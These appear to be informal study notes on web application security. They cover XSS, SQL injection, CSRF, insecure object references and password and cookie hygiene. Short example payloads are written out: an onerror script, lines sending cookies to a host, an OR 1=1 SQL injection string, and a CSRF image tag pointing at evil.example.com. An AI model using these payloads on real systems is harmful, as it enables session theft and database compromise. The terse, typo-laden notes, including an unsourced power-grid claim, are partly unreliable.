Javascript - all client side
	CSS : web app runs malicious code
		forums, bad links, emails, edited urls
		very bad: `document.write(iform.elements.['unsafe'].value`
		can be done by any site
		very vulnerable to man-in-the-middle
		can run in background without being detected
		
		bad: <img src='blash' onerror='javascript:malicious code'>
		worst without escaping characters, unsanitised inputs
		very worst: password managers, redirects
		
			this.src='http://127.0.0.1/?c="cookies"'
			requests.post('http://127.0.0.1', data=payload, cookies=cookies)
			
		good websites have multiple forms of verification
		bad sites just use cookies
	
	SQL inject: allows arbitrary execution on SQL database
		drop all tables
		view all tables
		little bobby tables

		happends when input isn't sanatized, statements aren't encapsulated
		can also run 'pre-built functions' instead of direct input
		ex: SELECT * FROM users WHERE email='$email' AND password=md5('xxx') OR 1=1--]');

	CSRF (Cross site request forgery):
		<img src="http://localhost/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent">
		youtube was hacked this way, myspace, etc

	Insecure Direct Object references: user gains access they aren't supposed to have
		path traversal, open redirect, url fuzzing
		should NOT be /users/sally/images, should be /users/reallylongrandomkey324532432/images
		otherwise, can type /users/bill/images and get anything
		
	Missing Function Level Action control
		no auth / auth is client-side
		no internal access control
	
	
	US power grid executes any command
		no security in mind
		Symantec reports russia hacked most of our power grid
	
	BAD:
		using known vulnerabilities
		http
		predictable cookies
		no salts
		shortening passwords (seriously, WTF?)
		no 2auth
		no hashing
		no tokens
		
	Mismanagement:
		Out of data
		no auth!!
		logs sent to client
		clear text
		md5, sha1
		clear text!!
	
	GOOD:
		https
		random long cookies
		salts
		infinite passwords
		2fa
